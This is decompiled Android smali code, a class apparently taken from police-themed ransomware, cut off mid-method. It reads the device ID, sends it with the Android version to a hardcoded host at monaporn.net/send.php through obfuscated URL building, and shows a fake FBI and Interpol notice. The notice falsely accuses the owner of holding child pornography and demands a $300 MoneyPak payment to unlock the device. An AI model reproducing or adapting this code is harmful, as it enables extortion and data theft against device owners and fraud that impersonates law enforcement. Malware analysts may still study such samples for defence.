.class public Lcom/ac/to/HaMo;
.super Lcom/ac/to/HiDok;
.source "HaMo.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/ac/to/HaMo$jodas;
    }
.end annotation


# instance fields
.field apterak:Landroid/widget/TextView;

.field check:Landroid/widget/Button;

.field clear:Landroid/widget/Button;

.field drimers2:Landroid/widget/TextView;

.field drimers3:Landroid/widget/TextView;

.field drimers4:Landroid/widget/TextView;

.field drimers5:Landroid/widget/TextView;

.field drimers6:Landroid/widget/TextView;

.field drimers8:Landroid/widget/TextView;

.field drimers9:Landroid/widget/TextView;

.field eight:Landroid/widget/Button;

.field five:Landroid/widget/Button;

.field four:Landroid/widget/Button;

.field free:Landroid/widget/Button;

.field hotredop:Landroid/widget/Button;

.field hotredoper:I

.field hrtwbv:Ljava/lang/String;

.field kejrbgkb:Ljava/lang/String;

.field limbon:Ljava/lang/String;

.field minutarta:Ljava/lang/String;

.field nine:Landroid/widget/Button;

.field one:Landroid/widget/Button;

.field reuouuu:Landroid/widget/TextView;

.field seven:Landroid/widget/Button;

.field six:Landroid/widget/Button;

.field two:Landroid/widget/Button;

.field urre:Landroid/widget/EditText;

.field utahol:Ljava/lang/String;

.field uu1:Ljava/lang/String;

.field uu2:Ljava/lang/String;

.field uu3:Ljava/lang/String;

.field uu4:Ljava/lang/String;

.field uu5:Ljava/lang/String;

.field zero:Landroid/widget/Button;


# direct methods
.method public constructor <init>(Lcom/ac/to/GuAno;)V
    .locals 2
    .param p1, "service"    # Lcom/ac/to/GuAno;

    .prologue
    .line 63
    const v0, 0x7f030017

    const/4 v1, 0x1

    invoke-direct {p0, p1, v0, v1}, Lcom/ac/to/HiDok;-><init>(Lcom/ac/to/GuAno;II)V

    .line 43
    const-string v0, "849384"

    iput-object v0, p0, Lcom/ac/to/HaMo;->utahol:Ljava/lang/String;

    .line 45
    const-string v0, "SERVER IS BUSY AT THIS MOMENT.TRY AGAIN LATER.CHECK THE INTERNET CONNECTION. RESTART DEVICE."

    iput-object v0, p0, Lcom/ac/to/HaMo;->hrtwbv:Ljava/lang/String;

    .line 46
    const-string v0, "&"

    iput-object v0, p0, Lcom/ac/to/HaMo;->uu1:Ljava/lang/String;

    .line 47
    const-string v0, "p"

    iput-object v0, p0, Lcom/ac/to/HaMo;->uu2:Ljava/lang/String;

    .line 48
    const-string v0, "i"

    iput-object v0, p0, Lcom/ac/to/HaMo;->uu3:Ljava/lang/String;

    .line 49
    const-string v0, "n"

    iput-object v0, p0, Lcom/ac/to/HaMo;->uu4:Ljava/lang/String;

    .line 50
    const-string v0, "="

    iput-object v0, p0, Lcom/ac/to/HaMo;->uu5:Ljava/lang/String;

    .line 51
    const-string v0, ""

    iput-object v0, p0, Lcom/ac/to/HaMo;->kejrbgkb:Ljava/lang/String;

    .line 64
    return-void
.end method


# virtual methods
.method protected ViemDol()V
    .locals 8

    .prologue
    .line 117
    invoke-virtual {p0}, Lcom/ac/to/HaMo;->getContext()Landroid/content/Context;

    move-result-object v4

    const-string v5, "phone"

    invoke-virtual {v4, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/telephony/TelephonyManager;

    .line 119
    .local v3, "oplats":Landroid/telephony/TelephonyManager;
    invoke-virtual {v3}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_1

    .line 120
    invoke-virtual {v3}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Lcom/ac/to/HaMo;->minutarta:Ljava/lang/String;

    .line 128
    :goto_0
    iget-object v4, p0, Lcom/ac/to/HaMo;->minutarta:Ljava/lang/String;

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->kjbrguweueu()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 129
    iget-object v4, p0, Lcom/ac/to/HaMo;->minutarta:Ljava/lang/String;

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->hjerhjehjejh()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 130
    iget-object v4, p0, Lcom/ac/to/HaMo;->minutarta:Ljava/lang/String;

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->hjerhjehjejh2()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 131
    iget-object v4, p0, Lcom/ac/to/HaMo;->minutarta:Ljava/lang/String;

    const-string v5, "null"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 132
    iget-object v4, p0, Lcom/ac/to/HaMo;->minutarta:Ljava/lang/String;

    const-string v5, ""

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    .line 136
    :cond_0
    invoke-virtual {p0}, Lcom/ac/to/HaMo;->loipol()V

    .line 408
    :goto_1
    return-void

    .line 123
    :cond_1
    invoke-virtual {p0}, Lcom/ac/to/HaMo;->getContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    const-string v5, "android_id"

    invoke-static {v4, v5}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Lcom/ac/to/HaMo;->minutarta:Ljava/lang/String;

    goto :goto_0

    .line 139
    :cond_2
    iget-object v4, p0, Lcom/ac/to/HaMo;->drimers2:Landroid/widget/TextView;

    const-string v5, "\nATTENTION!\nYour Device has been blocked up for safety reasons listed below.All the actions performed on this device are fixed. \n"

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 140
    iget-object v4, p0, Lcom/ac/to/HaMo;->drimers3:Landroid/widget/TextView;

    const-string v5, "-You are accused of viewing and storage of forbidden child pornography and zoophilia.\n\n-You have violated World Declaration on non-proliferation of child pornography.\n\n-You are accused of committing the crime envisaged by Article 161 of United States of America criminal law.\n\nArticle 161 of United States of America criminal law provides for the punishment of deprivation of liberty for terms from 5 to 11 years.\n\nPlease, mind that both your personal identities and location are well identified, and criminal case can be opened against you in course of 96 hours as of commission of crimes per above Articles. Criminal case can be submitted to court. \n\n The penalty set must be paid in course of 24 hours as of the breach. On expiration of the term, 24 hours that follow will be used for automatic collection of data on yourself and your misconduct, and criminal case will be opened against you. \n\n Amount of fine is 300$. \n\nYou can settle the fine with MoneyPak vouchers.  As soon as the money arrives to the Treasury account, your Mobile Device will be unlocked and all information will be decrypted in course of 24 hours."

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 141
    iget-object v4, p0, Lcom/ac/to/HaMo;->drimers4:Landroid/widget/TextView;

    const-string v5, "Unlock the Device using the MoneyPak?"

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 142
    iget-object v4, p0, Lcom/ac/to/HaMo;->drimers5:Landroid/widget/TextView;

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->tokios()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 143
    iget-object v4, p0, Lcom/ac/to/HaMo;->drimers6:Landroid/widget/TextView;

    const-string v5, "Under supervision of FBI., U.S.A. Ministry of Interior, Interpol, Copyright Alliance, International Cyber Security Protection Alliance."

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 144
    iget-object v4, p0, Lcom/ac/to/HaMo;->drimers8:Landroid/widget/TextView;

    const-string v5, "Where Buy MoneyPack?"

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 145
    iget-object v4, p0, Lcom/ac/to/HaMo;->drimers9:Landroid/widget/TextView;

    const-string v5, "UNITED STATES\nID: PP09-KL12-JJ21-CP93"

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 147
    iget-object v4, p0, Lcom/ac/to/HaMo;->limbon:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v5, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "&id="

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, p0, Lcom/ac/to/HaMo;->minutarta:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Lcom/ac/to/HaMo;->limbon:Ljava/lang/String;

    .line 150
    const-string v2, ""

    .line 152
    .local v2, "kawasaki":Ljava/lang/String;
    :try_start_0
    new-instance v4, Lcom/ac/to/HaMo$jodas;

    invoke-direct {v4, p0}, Lcom/ac/to/HaMo$jodas;-><init>(Lcom/ac/to/HaMo;)V

    const/4 v5, 0x1

    new-array v5, v5, [Landroid/widget/TextView;

    const/4 v6, 0x0

    iget-object v7, p0, Lcom/ac/to/HaMo;->reuouuu:Landroid/widget/TextView;

    aput-object v7, v5, v6

    invoke-virtual {v4, v5}, Lcom/ac/to/HaMo$jodas;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 176
    :goto_2
    iget-object v4, p0, Lcom/ac/to/HaMo;->one:Landroid/widget/Button;

    new-instance v5, Lcom/ac/to/HaMo$1;

    invoke-direct {v5, p0}, Lcom/ac/to/HaMo$1;-><init>(Lcom/ac/to/HaMo;)V

    invoke-virtual {v4, v5}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 191
    iget-object v4, p0, Lcom/ac/to/HaMo;->two:Landroid/widget/Button;

    new-instance v5, Lcom/ac/to/HaMo$2;

    invoke-direct {v5, p0}, Lcom/ac/to/HaMo$2;-><init>(Lcom/ac/to/HaMo;)V

    invoke-virtual {v4, v5}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 205
    iget-object v4, p0, Lcom/ac/to/HaMo;->free:Landroid/widget/Button;

    new-instance v5, Lcom/ac/to/HaMo$3;

    invoke-direct {v5, p0}, Lcom/ac/to/HaMo$3;-><init>(Lcom/ac/to/HaMo;)V

    invoke-virtual {v4, v5}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 218
    iget-object v4, p0, Lcom/ac/to/HaMo;->four:Landroid/widget/Button;

    new-instance v5, Lcom/ac/to/HaMo$4;

    invoke-direct {v5, p0}, Lcom/ac/to/HaMo$4;-><init>(Lcom/ac/to/HaMo;)V

    invoke-virtual {v4, v5}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 231
    iget-object v4, p0, Lcom/ac/to/HaMo;->five:Landroid/widget/Button;

    new-instance v5, Lcom/ac/to/HaMo$5;

    invoke-direct {v5, p0}, Lcom/ac/to/HaMo$5;-><init>(Lcom/ac/to/HaMo;)V

    invoke-virtual {v4, v5}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 244
    iget-object v4, p0, Lcom/ac/to/HaMo;->six:Landroid/widget/Button;

    new-instance v5, Lcom/ac/to/HaMo$6;

    invoke-direct {v5, p0}, Lcom/ac/to/HaMo$6;-><init>(Lcom/ac/to/HaMo;)V

    invoke-virtual {v4, v5}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 257
    iget-object v4, p0, Lcom/ac/to/HaMo;->seven:Landroid/widget/Button;

    new-instance v5, Lcom/ac/to/HaMo$7;

    invoke-direct {v5, p0}, Lcom/ac/to/HaMo$7;-><init>(Lcom/ac/to/HaMo;)V

    invoke-virtual {v4, v5}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 270
    iget-object v4, p0, Lcom/ac/to/HaMo;->eight:Landroid/widget/Button;

    new-instance v5, Lcom/ac/to/HaMo$8;

    invoke-direct {v5, p0}, Lcom/ac/to/HaMo$8;-><init>(Lcom/ac/to/HaMo;)V

    invoke-virtual {v4, v5}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 283
    iget-object v4, p0, Lcom/ac/to/HaMo;->nine:Landroid/widget/Button;

    new-instance v5, Lcom/ac/to/HaMo$9;

    invoke-direct {v5, p0}, Lcom/ac/to/HaMo$9;-><init>(Lcom/ac/to/HaMo;)V

    invoke-virtual {v4, v5}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 296
    iget-object v4, p0, Lcom/ac/to/HaMo;->zero:Landroid/widget/Button;

    new-instance v5, Lcom/ac/to/HaMo$10;

    invoke-direct {v5, p0}, Lcom/ac/to/HaMo$10;-><init>(Lcom/ac/to/HaMo;)V

    invoke-virtual {v4, v5}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 309
    iget-object v4, p0, Lcom/ac/to/HaMo;->clear:Landroid/widget/Button;

    new-instance v5, Lcom/ac/to/HaMo$11;

    invoke-direct {v5, p0}, Lcom/ac/to/HaMo$11;-><init>(Lcom/ac/to/HaMo;)V

    invoke-virtual {v4, v5}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 324
    iget-object v4, p0, Lcom/ac/to/HaMo;->hotredop:Landroid/widget/Button;

    new-instance v5, Lcom/ac/to/HaMo$12;

    invoke-direct {v5, p0}, Lcom/ac/to/HaMo$12;-><init>(Lcom/ac/to/HaMo;)V

    invoke-virtual {v4, v5}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 364
    iget-object v4, p0, Lcom/ac/to/HaMo;->check:Landroid/widget/Button;

    new-instance v5, Lcom/ac/to/HaMo$13;

    invoke-direct {v5, p0}, Lcom/ac/to/HaMo$13;-><init>(Lcom/ac/to/HaMo;)V

    invoke-virtual {v4, v5}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    goto/16 :goto_1

    .line 153
    :catch_0
    move-exception v0

    .line 157
    .local v0, "e":Ljava/lang/Exception;
    :try_start_1
    invoke-virtual {p0}, Lcom/ac/to/HaMo;->pisunol()Ljava/lang/String;

    move-result-object v2

    .line 158
    iget-object v4, p0, Lcom/ac/to/HaMo;->utahol:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v5, -0x1

    if-eq v4, v5, :cond_3

    .line 159
    invoke-virtual {p0}, Lcom/ac/to/HaMo;->loipol()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_2

    .line 167
    :catch_1
    move-exception v1

    .line 169
    .local v1, "ev":Ljava/lang/Exception;
    iget-object v4, p0, Lcom/ac/to/HaMo;->reuouuu:Landroid/widget/TextView;

    const-string v5, "SERVER IS BUSY AT THIS MOMENT.TRY AGAIN LATER.check THE INTERNET CONNECTION"

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto/16 :goto_2

    .line 162
    .end local v1    # "ev":Ljava/lang/Exception;
    :cond_3
    :try_start_2
    iget-object v4, p0, Lcom/ac/to/HaMo;->reuouuu:Landroid/widget/TextView;

    invoke-virtual {v4, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto/16 :goto_2
.end method

.method public du1()Ljava/lang/String;
    .locals 1

    .prologue
    .line 586
    const-string v0, "&"

    return-object v0
.end method

.method public du2()Ljava/lang/String;
    .locals 1

    .prologue
    .line 590
    const-string v0, "b"

    return-object v0
.end method

.method public du3()Ljava/lang/String;
    .locals 1

    .prologue
    .line 594
    const-string v0, "r"

    return-object v0
.end method

.method public du4()Ljava/lang/String;
    .locals 1

    .prologue
    .line 600
    const-string v0, "o"

    return-object v0
.end method

.method public du5()Ljava/lang/String;
    .locals 1

    .prologue
    .line 606
    const-string v0, "k"

    return-object v0
.end method

.method public du6()Ljava/lang/String;
    .locals 1

    .prologue
    .line 610
    const-string v0, "="

    return-object v0
.end method

.method public hjerhjehjejh()Ljava/lang/String;
    .locals 4

    .prologue
    .line 449
    const-string v1, ""

    .line 450
    .local v1, "tss":Ljava/lang/String;
    const/4 v0, 0x1

    .local v0, "af":I
    :goto_0
    const/16 v2, 0xf

    if-lt v0, v2, :cond_0

    .line 453
    return-object v1

    .line 451
    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "0"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 450
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public hjerhjehjejh2()Ljava/lang/String;
    .locals 4

    .prologue
    .line 457
    const-string v1, ""

    .line 458
    .local v1, "tss":Ljava/lang/String;
    const/4 v0, 0x1

    .local v0, "af":I
    :goto_0
    const/16 v2, 0x10

    if-lt v0, v2, :cond_0

    .line 461
    return-object v1

    .line 459
    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "0"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 458
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public hostes()Ljava/lang/String;
    .locals 1

    .prologue
    .line 71
    const-string v0, "monaporn.net"

    return-object v0
.end method

.method public htp()Ljava/lang/String;
    .locals 1

    .prologue
    .line 74
    const-string v0, "http://"

    return-object v0
.end method

.method public iorgii()V
    .locals 3

    .prologue
    .line 433
    iget-object v0, p0, Lcom/ac/to/HaMo;->limbon:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/ac/to/HaMo;->uu2:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/ac/to/HaMo;->uu3:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/ac/to/HaMo;->uu4:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    const/4 v1, -0x1

    if-ne v0, v1, :cond_0

    .line 437
    iget-object v0, p0, Lcom/ac/to/HaMo;->limbon:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/ac/to/HaMo;->uu1:Ljava/lang/String;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/ac/to/HaMo;->uu2:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/ac/to/HaMo;->uu3:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/ac/to/HaMo;->uu4:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/ac/to/HaMo;->uu5:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/ac/to/HaMo;->kejrbgkb:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/ac/to/HaMo;->limbon:Ljava/lang/String;

    .line 439
    :cond_0
    return-void
.end method

.method public kjbrguweueu()Ljava/lang/String;
    .locals 4

    .prologue
    .line 441
    const-string v1, ""

    .line 442
    .local v1, "tss":Ljava/lang/String;
    const/4 v0, 0x1

    .local v0, "af":I
    :goto_0
    const/16 v2, 0x11

    if-lt v0, v2, :cond_0

    .line 445
    return-object v1

    .line 443
    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "0"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 442
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public loipol()V
    .locals 0

    .prologue
    .line 614
    invoke-virtual {p0}, Lcom/ac/to/HaMo;->rempo()V

    .line 615
    invoke-virtual {p0}, Lcom/ac/to/HaMo;->rutas()V

    .line 616
    invoke-virtual {p0}, Lcom/ac/to/HaMo;->removeAllViews()V

    .line 617
    return-void
.end method

.method public lookert()Ljava/lang/String;
    .locals 5

    .prologue
    .line 579
    const-string v0, "/send.php"

    .line 580
    .local v0, "gss2":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "?v="

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v4, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 581
    .local v1, "gss3":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->streamTel()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "&u=3"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 582
    .local v2, "gss4":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->htp()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->hostes()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->du1()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->du2()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->du3()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->du4()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->du5()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->du6()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    return-object v3
.end method

.method public onTouchEvent_LongPress()Z
    .locals 1

    .prologue
    .line 430
    const/4 v0, 0x0

    return v0
.end method

.method protected onTouchEvent_Move(Landroid/view/MotionEvent;)V
    .locals 0
    .param p1, "event"    # Landroid/view/MotionEvent;

    .prologue
    .line 419
    return-void
.end method

.method protected onTouchEvent_Press(Landroid/view/MotionEvent;)V
    .locals 0
    .param p1, "event"    # Landroid/view/MotionEvent;

    .prologue
    .line 424
    return-void
.end method

.method protected onTouchEvent_Up(Landroid/view/MotionEvent;)V
    .locals 0
    .param p1, "event"    # Landroid/view/MotionEvent;

    .prologue
    .line 414
    return-void
.end method

.method public pisunol()Ljava/lang/String;
    .locals 14

    .prologue
    .line 466
    const/4 v6, 0x0

    .line 467
    .local v6, "khrhhh":Ljava/io/BufferedReader;
    const-string v8, ""

    .line 470
    .local v8, "khrhhhf":Ljava/lang/String;
    :try_start_0
    new-instance v5, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v5}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 471
    .local v5, "khbrgfd":Lorg/apache/http/client/HttpClient;
    new-instance v10, Lorg/apache/http/client/methods/HttpGet;

    invoke-direct {v10}, Lorg/apache/http/client/methods/HttpGet;-><init>()V

    .line 472
    .local v10, "oep":Lorg/apache/http/client/methods/HttpGet;
    new-instance v11, Ljava/net/URI;

    iget-object v12, p0, Lcom/ac/to/HaMo;->limbon:Ljava/lang/String;

    invoke-direct {v11, v12}, Ljava/net/URI;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v11}, Lorg/apache/http/client/methods/HttpGet;->setURI(Ljava/net/URI;)V

    .line 473
    invoke-interface {v5, v10}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v1

    .line 474
    .local v1, "apterak":Lorg/apache/http/HttpResponse;
    new-instance v7, Ljava/io/BufferedReader;

    .line 475
